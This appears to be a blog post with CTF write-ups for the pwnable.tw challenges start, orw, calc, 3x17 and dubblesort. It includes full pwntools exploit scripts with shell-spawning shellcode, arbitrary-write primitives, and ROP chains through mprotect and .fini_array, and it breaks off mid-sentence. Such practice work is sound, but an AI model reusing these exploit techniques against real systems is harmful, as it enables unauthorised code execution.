---
layout: post
title:  "Pwnable TW Walkthrough"
date:   2024-12-27 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Start

The first challenge, we're given relatively small 32-bit binary:

```bash
$ checksec ./start
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX disabled
PIE:        No PIE (0x8048000)
Stripped:   No

$ file ./start
./start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

In addition to being statically linked, the binary has no libc, and seems to be a manually-written assembly file. IDA Decompilation attempt fails. \
By reading the assembly, it seems to be pushing the "Let's start the CTF:" string to the stack. It then 
writes this message to `stdout`. By using `stace`, we can see it then attempts to read 60 bytes off the user, right to the same stack address of the prompt string. Hence, linear stack overflow. \
The solution is simple - write shellcode, make sure the RA is set to its address. 

The main challenge is the fact that there's ASLR, and we have no leak. But notice the binary isn't PIE, hence we can jump to static code addresses. A very interesting code to jump to, is right before the call to `write`:

```bash
mov ecx, esp
mov dl, 14h
mov bl, 1
mov al, 4
int 80h  // sys_write
xor ebx, ebx
mov dl, 3Ch
mov al, 3
int 80h  // sys_read
```

This means we can easily obtain stack leak, as we can print values that resides within the stack. Win.

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

HOST = 'chall.pwnable.tw'
PORT = 10000
context.arch='i386'
BINARY = './start'
GDB_SCRIPT = '''
b *_start+60
commands
    p "In start.."
end

c
'''

READ_BUF_SIZE = 60
WRITE_BUF_SIZE = 0x14
WRITE_STACK_BUF_TO_STDOUT_ADDR = 0x8048087
SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''
# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e


def leak_stack_addr(p):
    buf = b'A' * WRITE_BUF_SIZE # pad
    buf += p32(WRITE_STACK_BUF_TO_STDOUT_ADDR)
    p.send(buf)
    leak_buf = p.recv(WRITE_BUF_SIZE)
    assert(len(leak_buf) == WRITE_BUF_SIZE)
    
    addr = u32(leak_buf[: 4])
    return addr

def write_and_jump_to_shellcode(p, shellcode_addr):
    buf = b'B' * WRITE_BUF_SIZE
    buf += p32(shellcode_addr) 
    shellcode_asm = SHELLCODE.format(shellcode_addr + OFFSET_TO_BIN_SH)
    log.info(f'Writing shellcode:\n{shellcode_asm}')
    buf += asm(shellcode_asm)
    buf += b'C' * (READ_BUF_SIZE - len(buf))
    p.send(buf)

def exploit(p):
    p.recvuntil(b"Let's start the CTF:")
    stack_leak = leak_stack_addr(p)    
    shellcode_addr = stack_leak + WRITE_BUF_SIZE
    log.info(f'stack_leak: {hex(stack_leak)} shellcode_addr: {hex(shellcode_addr)}')
    write_and_jump_to_shellcode(p, shellcode_addr)


def main():
    is_debug = False 
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## Orw

Open, read, write. \

```bash
$ checksec orw
[*] '/home/itay/projects/pwnable_tw/orw/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

$ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped

$ ldd orw
    linux-gate.so.1 (0xee44a000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xee1fd000)
    /lib/ld-linux.so.2 (0xee44c000)
```

Using the previous challenge's access, we can copy the used `libc` and `ld-linux` to our local setup, and use `patchelf` to mimic the remote environment. \
Using `strace`, we can see the binary installs a "seccomp" by calling:

```bash
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=12, filter=0xff8c8cac}) = 0
```

After some readings, the `no_new_privs` bit prevents inherited processes to grant extra privileges, such as changing the `setuid` bit, or add capabilities. This may hint this challenge involves spawning a new process. We also see the shellcode is stored within a constant address within the binary. \
Writing an ORW shellcode solves this challenge easily. By default, my environment doesn't allows executing code from the .BSS. But since DEP is disabled on the remote, the following works:

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

HOST = 'chall.pwnable.tw'
PORT = 10001
context.arch='i386'
BINARY = './orw'
GDB_SCRIPT = '''
b *0x804858a
commands
    p "In SC.."
end

c
'''

SHELLCODE_ADDR = 0x804a060
SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x05
pop eax
int 0x80

mov ebx, eax
mov ecx, {1}
mov edx, 0x40
push 0x03
pop eax
int 0x80

push 0x01
pop ebx
mov ecx, {1}
mov edx, 0x40
push 0x04
pop eax
int 0x80

FLAG:
.ascii "/home/orw/flag"
.byte 0x00

BUF:
.rept 0x40
.byte 0x00
.endr
'''
OFFSET_TO_FLAG = 0x31
OFFSET_TO_BUF = 0x40


def write_shellcode(p):
    shellcode_asm = SHELLCODE.format(SHELLCODE_ADDR + OFFSET_TO_FLAG, SHELLCODE_ADDR + OFFSET_TO_BUF)
    log.info(f'Writing shellcode:\n{shellcode_asm}')
    buf = asm(shellcode_asm)
    p.send(buf)

def exploit(p):
    p.recvuntil(b"Give my your shellcode:")
    write_shellcode(p)

def main():
    is_debug = False
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## Calc

Microsoft calculator? 

```bash
$ checksec calc
[*] '/home/itay/projects/pwnable_tw/calc/calc'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

$ file calc
calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
```

### Overview

The program allocates buffer of size `0x400` bytes on the stack, which stores the calculator expression. \
It reads up to `0x400` bytes, one byte at a time. Interesitngly, **there's off-by-one vuln**:

```c
while ( i < size && read(0, &c, 1) != -1 && c != '\n' )
  {
    if ( c == '+' || c == '-' || c == '*' || c == '/' || c == '%' || c > '/' && c <= '9' )
    {
      i_cp = i++;
      addr[i_cp] = c;
    }
  }
  addr[i] = 0;
```

While up to `0x400` bytes are read into the `0x400` bytes buffer, the last assignment of `addr[i] = 0` occurs 1 byte past the buffer's end. \
Next, `init_pool` is called, nullifies all `101` bytes of the pool's buffer. Notice, that since the pool buffer was declared as `int[101]`, there might be alignment issues - potentially leaving uninitialized bytes. So this probably means our previous off-by-one vuln has no impact. \
The interesting logic occurs within `parse_expr`. It has few sus notes:

1. The main loop is unbounded - it doesn't compares `i` value to `0x400`. The only check being made is whether or not `expr[i]` is an operator. As long as this is not the case, OOB-R would occur, eventually accessing the `pool` buffer. This means that if we initialize the `pool` buffer to some content, we might be able to leak it using `expr[i]`.

2. Logical vuln - Upon parsing the first subexperssion (the string prior to the operator), it is being compared to the `"0"` string. However, we may supply values such as `"000"` which would pass this check. 

3. `atoi` is being used, instead of `strtol`. This masks any possible number-parsing errors. 

4. Negative numbers handling - there seems to be a check that the resulting parsed number is positive, yet in case of a zero / negative number - nothing is being done (yet the flow continues without any error). 

5. The `pool` buffer current index is saved as its first member. Storage of the parsed number is being made solely using that index. If we can corrupt this value, for example by off-by-one of the `expr` buffer, we main obtain OOB-W using the `pool` buffer. 

```C
pool_i = (*pool)++;                     // Fetches the current pool index. The first int within the pool seems to be tracking this, sus.
                                        // There seems to be no check regarding its value, hence - potential OOB
pool[pool_i + 1] = parsed_num;          // Can be arbitrary large value
```

6. The `pool_i` index increments indefinetly, without any sanity check (that it doesn't passes the maximal value of `100`). This may serve as an important primitive for OOB-W.

7. The check of no two consequtive operators is being made on `expr[i], expr[i+1]`. This means a clear OOB-read for `expr[i + 1]` (which can be controlled easily using the `pool` buffer).

8. At the end of the loop, there's code that should handle operators precedence. The operators buffer is of size `100` bytes, yet its index can grow indefinetly. Clear OOB-RW. 

9. Also regarding the operators precedence code - the code path of decrementing the index of the operators buffer seems unreachable under regular flow (unless we would set `expr[i]` to something other than an operator). 

10. The `eval` function doesn't handles the case of `'%'` operator. Regardless of which operator was called, the `pool_i` index is being decremented. This means that by calling this method lots of times with the `'%'` operator, we would be able to decrement the `pool` index to some very low value. 

11. At the very end of the `parse_expr` function, we call `eval` on the `pool` and operators buffers, with a decreasing order. This means we can supply large number of operators, and the `pool` index would be altered. 

### Exploitation

Since the only allocation that involves the heap seems to be the subexperssion parsing (where it is only being used as a "read" variable), 
it might be challenging to exploit this challenge solely using heap corruptions. \
Hence, I'd probably aim for stack corruptions to achieve RCE. \
Because the binary isn't PIE, as well as partial RELRO, overwriting a GOT entry seems to be an easy way to call address of our wish. 

Notice, wer'e not given with a `libc` binary, **and the binary is statically linked**. This means it won't be able to fetch during runtime extra symbols it doesn't have off libc. 
Hence, I assume we'd like to achieve call primitive to some code within the binary itself. \
The class symbols of `execve, system[, win(classic ctf symbol..)]` aren't imported. 
However, the following interesting symbols are imported (the `calc` program itself doesn't have any interesting symbols for RCE):

1. `mprotect` - always a yummy target

2. `_dl_make_stack_executable` - good candidate

3. `environ` - holds the stack address. May be useful for stack leak primitive

4. Various writable `hook` functions, such as `__malloc_hook` and `dl_open_hooks`.  

5. File streams - our program `fflush`'s `stdout`, it might be interesting to overwrite the `stdout` file stream (**which resides at a known data address, as the binary is statically linked**) - `_IO_2_1_stdout_`.

#### Controlled RW - Shellcode Memory

First, we have to consider where we would place our shellcode at. 
While the `expr` buf seems as a very limited candidate, as it only allows numeric values, 
the `pool` buf may actually contain fully arbitrary content. \
Since the `%` operator wasn't implemented, we can concatenate our shellcode values, 4 bytes at a time, placing `%` in between. 
Also, notice that `pool` is a stack address.  

#### Stack Leakage

No matter which approach we'd take, a stack leak would probably serve us. \
Recall the program prompts the result using `pool[pool[0]]`. If we can find an interesting index, either before or after the pool within the stack, we can easily obtain such a leak. \
The `pool` buffer is always being allocated before the `expr` buffer. The following `pool` stack layout occurs:

```bash
pwndbg> x/50wx 0xff88ce28 - 0x20
0xff88ce08:     0xff88d3c8      0x080493f2      0xff88cfbc      0xff88ce28
0xff88ce18:     0x00000000      0x00000000      0x00000000      0x00000000
0xff88ce28:     0x00000000      0x00000000      0x00000000      0x00000000
```

Which means that `pool[-5]` would yield us the address of `pool` itself. \
How can we decrement the index to a value of our wish? 
We'd call `eval` multiple times with the `'%'` operator (such that it won't overwrite the `pool` itself). 
Moreover, we should make sure the index doesn't increments at all - which happens in case `atoi` returns a negative number (or zero). 

Therefore, the following simple expression would leak the `pool` address:

```bash
stack_leak_index = 5
buf = (b'00' + b'%') * stack_leak_index + b'00'
# Leaks 0xff88ce28
```

Notice we can use a similar approach, using a different offset, in order to leak the stack canary. 

#### Write primitive

We can obtain stack-write primitive pretty naively - by using the `pool` OOB-W, 
and writing arbitrary content to the stack. \
In terms of obtaining RCE, implementing a generic write primitive is probably an overkill for this challenge. 
We can simply do ROP, calling `mprotect` on our shellcode, and by the end of it, simply jump to the shellcode. \
However, I personally prefer exploitation routes that do not involve classic ROP 
(mainly because it is fragile, as well as not relevant to many of modern platform's mitigations). 

Therefore, my idea is to leverage the stack-write primitive into a generic write primitive. \
A cool approach we should consider, is overwriting `pool_i = pool[0]` (which resides on the stack) 
with our controlled input (this can be done easily, by first decrementing the pool index by 1). 
By doing so, we can obtain a real absolute-write primitive, 
as `pool[pool[0] + 1] = num` is being set (`num` is ACID). \
Notice that `pool[0] + 1` is parsed as an index to `int[]`, 
hence this would allow us arbitrary write primitive to 4-byte-aligned addresses, as follows:

```bash
addr = &pool + 4 * (num1 + 1)
*addr = num2
```

Where we control `num1, num2`, leaked the address of `pool`, 
and can access any address by wrap-around of the 32-bit VA space. \
This gives us a full arbitrary-write primitive!

#### RCE

Having any leak we desire, as well as a full arbtitrary write primitive, the road to RCE seems short. \
Instead of storing our shellcode within `pool` (which gets nullified for every new expression), 
we can store it at some constant RW memory area, for example at the `.bss`. \
After storing our shellcode at the data segment, we shall overwrite some exit handler / `.fini` pointer, 
such that our shellcode would get trigerred upon program termination. \
Lastly, we shall call `mprotect` on the stored shellcode, to enable NX. 
We can do so by classic ROP (I hate this though). 

### Solution

The following script pops our desired RCE shell:

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10100
context.arch='i386'
BINARY = './calc'
GDB_SCRIPT = '''
# b *0x08049160
# commands
#   p "Gonna update pool_i.."
# end

b *0x8049433
commands
    p "Exiting calc.."
end

c
'''

SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''

# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e

# Offsets
POOL_TO_CALC_RA_OFFSET = 0x5a4

# Constants
POOL_ADDR_INDEX = 5
CANARY_INDEX = 11

# Addresses
SHELLCODE_ADDR = 0x080eca50  # RW memory within the data segment, always initialized to zeros
MPROTECT_ADDR = 0x806f1f0


def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def readStack(p, index):
    log.info(f'read_stack, index: {index}')
    # Decrement pool[0] index times. 
    buf = b''
    buf += (b'00' + b'%') * index + b'00'
    log.info(f'Writing buf:\n{buf}')
    p.sendline(buf)

    # Read pool[pool[0]] = pool[-1 * index]
    leak = unsigned(int(p.recvline()[:-1], 10))
    return leak

def write32(p, pool_addr, addr, value):
    log.info(f'arbitrary_write: *{hex(addr)} = {hex(value)}')
    assert(addr % 4 == 0)
    # addr = &pool + 4 * (num + 1). 
    # We omit the 1, because the index would be incremented by 1
    num = int(unsigned(addr - pool_addr) / 4)

    buf = (b'00' + b'%') * 2
    buf += str(num).encode()
    buf += b'%' + str(value).encode()
    log.info(f'Writing buf:\n{buf}')
    p.sendline(buf)
    result = unsigned(int(p.recvline()[:-1], 10))
    log.info(f'Result:\n{result}')

def writeBytes(p, pool_addr, addr, bytes_):
    assert (len(bytes_) % 4) == 0
    for i, buf_bytes in enumerate(splitted(bytes_, 4)):
        bytes_value = u32(buf_bytes)
        write32(p, pool_addr, addr=addr + 4 * i, value=bytes_value)

def writeShellcodeAtAddr(p, pool_addr, addr):
    shellcode_asm = SHELLCODE.format(addr + OFFSET_TO_BIN_SH)
    log.critical(f'Writing shellcode:\n{shellcode_asm}')
    shellcode = asm(shellcode_asm)
    shellcode = pad(shellcode, 4)
    writeBytes(p, pool_addr, addr=addr, bytes_=shellcode)

def writeMprotectAndJumpToShellcodeRop(p, pool_addr, shellcode_addr):
    calc_ra_addr = pool_addr + POOL_TO_CALC_RA_OFFSET 
    rop_bytes = b''
    rop_bytes += p32(MPROTECT_ADDR)
    rop_bytes += p32(SHELLCODE_ADDR)
    rop_bytes += p32(SHELLCODE_ADDR & 0xfffff000)
    rop_bytes += p32(0x2000)
    rop_bytes += p32(7)
    log.critical(f'Writing rop bytes:\n{rop_bytes}')
    writeBytes(p, pool_addr, addr=calc_ra_addr, bytes_=rop_bytes)

def exitCalcLoop(p):
    buf = b''
    p.sendline(buf)

def exploit(p):
    p.recvuntil(b"=== Welcome to SECPROG calculator ===\n")
    
    pool_addr = readStack(p, POOL_ADDR_INDEX)
    log.info(f'pool_addr: {hex(pool_addr)}')
    assert((pool_addr % 4 == 0) and (pool_addr != 0))

    canary = readStack(p, CANARY_INDEX)
    log.info(f'canary: {hex(canary)}')
    assert((canary & 0xff == 0) and (canary != 0))

    writeShellcodeAtAddr(p, pool_addr, addr=SHELLCODE_ADDR)
    writeMprotectAndJumpToShellcodeRop(p, pool_addr, SHELLCODE_ADDR)
    exitCalcLoop(p)


def main():
    is_debug = False
    is_remote = True 
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

After reading some other writeups, 
apparently this solution was unique. I couldn't find any other solution that used the logical vuln of multiple `"00"`, 
nor the generic mechanism of `pool_i` underflow using the `"%"` character (nor the other buffer's OOB). \
Instead, most of the solutions have used the prefix-operator usage vuln, which I didn't use. 

## 3x17

```bash
$ checksec 3x17
[*] '/home/itay/projects/pwnable_tw/3x17/3x17'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

$ file 3x17
3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
```

Finally, 64-bit binary. Stripped though. 

### Overview

The program prompts us, asking for `"addr:"` and `"data:"`. 
There's also a counter, making sure this is called only once. 
Notice we can write `0x18` bytes. \
Hence, the challenge idea is simple (yet challenging) - 
**having a single arbitrary write, without any leak, obtain RCE.**

Btw, 3x17 is an interesting name for a challenge, and it probably serves as some kind of hint. 

### Exploitation

#### Idea (Failed) - One gadget

The first idea, of course, is to overwrite the counter, as it is placed within
some constant `.bss` address. However, right after doing so, the program would terminate. \
The second idea is to use one-gadget. By changing the program's control flow into the one-gadget address 
(which is known, as the binary is statically linked and no PIE), we would win. \
So this solves the `data` we would like to write. But which `addr` we would like to write to?
Because theres no stack leak, I aimed to obtain branch primitive by overwriting a `.fini` handler. \
Recall how `_start` invokes `main` - it calls `__libc_start_main`, with `main` address as one of its parameters. 
However, some of the other parameters are the `init, fini` code snippets. 
In this binary, `0x402960` serves as the destructor code, which would be executed right prior 
to program's termination, invoking function pointers off `.fini_array`, which is located
within `0x4b40f0` on our binary, and contains `2` default handlers. \
So in short, I'll simply execute the following:

```bash
*_fini_array[0] = one_gadget;
```

However, upon running one gadget on the static binary, I've noticed it was only compiled with part of its needed libc. \
Hence, It did not contain the code snippet that usually wrapped within `system`, and there were no references of `/bin/sh`.

#### Idea - .init_array, .fini_array

As mentioned, the `.fini_array` actually contains 2 slots, and our write primitive allows `0x18` linear write. 
Hence, we can overwrite the 2 handlers that are stored there, making sure `main` would be called once again,
allowing extra invocation of the write primitive, along with setting the return address. \
**We can take this approach further** - instead of jumping back to `main`, jump back to `_start`.
By doing so, we would also first invoke the `.init_array` handlers before executing `main`. 
This also may explain why overwrite of `0x18` was given within the challenge. 
The challenge's name may hint there are `3` invocations involved, but not sure why `17` (and not `18`?) though. \
At this point, I've decided I have to go deeper into the ELF initialization & termination processes, focusing on our
controlled arrays. The [following great article][elf-start] explains exactly this.

#### __libc_csu_init, __libc_csu_fini

A very good candidates we can set our `.fini_array` entry to. 
By doing so, it invokes the 2 handlers of the `.init{fini}_array` one after another, without any stack-layout requirement. \
While it doesn't seem significant, 
it actually transforms our arbtitrary-single-branch primitive into arbitrary-double-branch primitive. 
However, we still need to write our shellcode somewhere, make it executable, and jump to it. 

#### Re-execution

To achieve our prerequisites for running the shellcode, we must be able to invoke the write primitive multiple times. 
Now that we can jump into any 2 addresses we wish (by jumping to the `.init_array` runner routine), we can think of some wacky ideas. \
For example, setting the second init handler to the same `.init_array` runner routine, while setting the first - to the arbitrary write within `main`. 

**The big obstacle of this challenge, is having the `counter` check within `main`**, hence - invoking main multiple times won't naively work. \ 
However, the counter is actually saved as a single byte within global variable. 
By invoking `main` 256 times, integer overflow occurs, and the counter is reset back to `0`. 
This means that by making an infinite jump trampoline to `main`, we would eventually be able to re-execute the write primitive code!

#### Termination

Right upon invoking the `.fini_array` handlers within `__libc_csu_fini`, 
`rbp` is always initialized to the `.fini_array` address. 

```bash
pwndbg> x/10gx $rbp
0x4b40f0:       0x0000000000402960      0x0000000000401b6d
0x4b4100:       0x0000000d00000002      0x000000000048f7e0
```

This means that if we would find `leave ; ret` gadget, we would first load `rbp + 8` to `rsp` (`0x4b40f8` in the example),
and jump to whatever resides there. \
Hence, we shall overwrite `.fini_array[0] = leave_gadget`, and `.fini_array[1] = RA`.
The easiest way to exploit this would probably be a ROP chain, where the above `RA` stands for the first gadget's address.

### Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10105
context.arch='amd64'
BINARY = './3x17'
GDB_SCRIPT = '''
b *0x41e4af
commands
    p "Called leave.."
end

c
'''

binary_rop = ROP(BINARY)

# Offsets

# Constants
CHUNK_SIZE = 0x18

# Addresses
FINI_ARRAY = 0x4b40f0
MAIN = 0x401b6d
LIBC_CSU_FINI = 0x402960 
SHELLCODE_ADDR = 0x4B9C00  # Just random RW memory

pop_rdi_ret = binary_rop.rdi.address
pop_rsi_ret = binary_rop.rsi.address
pop_rdx_ret = binary_rop.rdx.address
pop_rax_ret = binary_rop.rax.address
leave_ret = binary_rop.find_gadget(['leave']).address
syscall = binary_rop.find_gadget(['syscall']).address
log.info(f'pop_rdi_ret: {hex(pop_rdi_ret)}')
log.info(f'pop_rsi_ret: {hex(pop_rsi_ret)}')
log.info(f'pop_rdx_ret: {hex(pop_rdx_ret)}')
log.info(f'pop_rax_ret: {hex(pop_rax_ret)}')
log.info(f'leave_ret: {hex(leave_ret)}')
log.info(f'syscall: {hex(syscall)}')


def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def write(p, addr, data):
    p.recvuntil(b'addr:')
    p.sendline(str(addr).encode())
    p.recvuntil(b'data:')
    p.send(data)

def exploit(p):
    buf = b''
    buf += p64(LIBC_CSU_FINI)       # .fini_array[0] - redo! 
    buf += p64(MAIN)                # .fini_array[1] - call to main. This would use the counter integer overflow, after 256 times - reseting it back to 0
    write(p, addr=FINI_ARRAY, data=buf)  # Arbitrary-write enabled!

    rop_buf = p64(leave_ret)
    rop_buf += p64(pop_rax_ret)
    rop_buf += p64(0x3b)
    rop_buf += p64(pop_rsi_ret)
    rop_buf += p64(0)
    rop_buf += p64(pop_rdx_ret)
    rop_buf += p64(0)
    rop_buf += p64(pop_rdi_ret)
    rop_buf += p64(FINI_ARRAY + len(rop_buf) + 0x10)
    rop_buf += p64(syscall)
    rop_buf += b'/bin/sh\x00'

    write(p, addr=FINI_ARRAY + 3 * CHUNK_SIZE, data=rop_buf[3 * CHUNK_SIZE: 3 * CHUNK_SIZE + 0x10])
    write(p, addr=FINI_ARRAY + 2 * CHUNK_SIZE, data=rop_buf[2 * CHUNK_SIZE: 3 * CHUNK_SIZE])
    write(p, addr=FINI_ARRAY + CHUNK_SIZE, data=rop_buf[CHUNK_SIZE: 2 * CHUNK_SIZE])
    write(p, addr=FINI_ARRAY, data=rop_buf[: CHUNK_SIZE])    


def main():
    is_debug = False
    is_remote = True
    if is_debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if is_remote:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## dubblesort

```bash
$ checksec ./dubblesort
[*] '/home/itay/projects/pwnable_tw/dubblesort/dubblesort'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
$ file dubblesort
dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped
```

Full mitigations 32-bit binary.

### Overview

The program asks for username, number of elements to sort, and the elements themselves. 
It then produces an output of the sorted elements array. \
There are many sus notes:

1. The program reads `0x40` bytes into the `0x40` name buffer. Hence, no room for the null terminator, producing an untruncated string. It can be useful in order to leak the preceding bytes. Another vuln might be the fact that this array isn't initialized to `\x00`.

2. No checks regarding the elements array size. It can be both a very large number, or the special case of `0`. 

3. While reading the numbers array, they are being stored within `int[8]` static array on the stack. What would happen if we'd read more than 8 elements..? Probably OOB-RW.

4. Related to above - within the reading loop's body, there seems to be a redundant assignment of stack local variables. However, if we can corrupt the values past the `int[8]` array, this assignment may have some interesting impact.

5. Also regarding the numbers reading - notice that it uses the `"%u"` format specifier to read the numbers. However, in case we would insert some unlegitimate byte, such as `'A'`, parsing won't occur, and the number's value would remain uninitialized. Indeed, when I've entered `A` character as the number, the program had leaked tons of memory as `Result`.

6. Although defined with unsigned format specifier, the numbers defined as `int`s, and can be negative. 

7. Within the process routine, the `size` is defined as `int`, not unsigned. This may have critical impact, as `nums_arr[size -1]` is being accessed, possibly performing OOB BEFORE the array's start. 


### Exploitation

#### Debug Environemnt

Because we're given a partciular version of `libc`, we shall patch the binary to use it instead - and mimic the remote environment accurately.

```bash
patchelf --replace-needed libc.so.6 ./libc.so.6 "./dubblesort"
```

However, this approach didn't seem to work, and the following error occured:

```bash
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

I've also tried using `LD_LIBRARY_PATH=. ./dubblesort`, as well as `LD_PRELOAD=./libc.so.6 ./dubblesort`, 
having the exact same output. Therefore, the mismatch between `ld` and `libc` version is critical. \
Hence, my next goal is to retireve a matching `ld.so`.

The following interesting grep gave me some kind of hint:

```bash
$ strings libc.so.6  | grep "stable release"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.
```

So this glibc-2.23 is expected to run on some older ubuntu machine. \
Its official page is `https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5`, 
and **it seems to be part of the `xenial` distribution.**
Apparently there's an amazing tool - [glibc-all-in-one][glibc-all-in-one], which helps to debug & compile glibc easily. 

```bash
git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
./update_list

mkdir debs
mkdir -p libs/2.23-ubuntu5_i386
cd debs
wget https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5/+build/11213404/+files/libc6_2.23-0ubuntu5_i386.deb
cd ..
./extract debs/libc6_2.23-0ubuntu5_i386.deb libs/2.23-0ubuntu5_i386
```

Now our desired `ld.so` resides under `libs/`! Using the following `patchelf` commands, we can mimic the exact remote environment:

```bash
#!/bin/sh

BINARY="./dubblesort"
cp $BINARY "${BINARY}.bk"
patchelf --set-interpreter ./ld-2.23.so $BINARY
patchelf --replace-needed libc.so.6 ./libc_32.so.6 $BINARY
```

Now we can finally run the binary locally, without any errors!

#### Read Primitive

Because the primitive we have is linear stack overflow, we must achieve a stack read primitive. 
Leaking `libc` and potentially the program's base address would probably also serve us within the exploitation. \
Recall the first vuln, where the given `name` string is untruncated. 
This indeed results with an OOB-R, however - notice the stack canary is the consecutive dword for this name buffer:

```bash
0xff85b6b0:     0xf6852608      0x00000009      0xff85b71c      0x41414141
0xff85b6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xff85b6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xff85b6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xff85b6f0:     0x41414141      0x41414141      0x41414141      0xacdfa700
```

A smart design decision of the stack canary, was to have its `LSB` always set to `\x00`, preventing leaks just like this. 
Therefore, we won't be able to leak information this way. \
However, recall there's another bug, as the name array wasn't initialized at all. What if we would send a very short string? \
Unfortunately, sending an empty buffer (0 bytes) halts the program. Hence, we need to send at least 1 byte in order for the `read` call to be non-blocking. 
In this example, I've sent a single `b'A'`, which is stored within `0xff8e73cc`. This gives us a partial stack leak primitive:

```bash
pwndbg> x/20wx $esp
0xff8e7390:     0x590d9bfa      0xff8e73a8      0xff8e73cc      0x00000000
0xff8e73a0:     0x00000000      0x00000000      0x00000000      0xf59af000
0xff8e73b0:     0xf5976570      0xffffffff      0x590d9034      0xf59786d0
0xff8e73c0:     0xf59af608      0x00000009      0xff8e742c      0xff8e7541
0xff8e73d0:     0x00000000      0x00000000      0x01000000      0x00000009
```

Because of the `'%s'` format specifier, 4 bytes would be leaked - `0xff8e7541`. Of course, the LSB is corrupted. 
However, notice that ASLR doesn't affect the lowest nibble, hence it should be some constant value we can easily brute force. \
An optimization for the above approach, would be to overwrite up to some other interesting addresses, and by doing so - also leaking `libc` addresses:

```bash
0xff8e73c0:     0xf59af608      0x00000009      0xff8e742c      0xff8e7541
0xff8e73d0:     0x00000000      0x00000000      0x01000000      0x00000009
0xff8e73e0:     0xf5976570      0x00000000      0xf57414be      0xf5953054
0xff8e73f0:     0xf59704a0      0xf5988f90      0xf57414be      0xf59704a0
0xff8e7400:     0xff8e7440      0xf597066c      0xf5970b40      0x37ac2f00
```

In this example, if we would overwrite `0x34` bytes, we would leak stack address, 
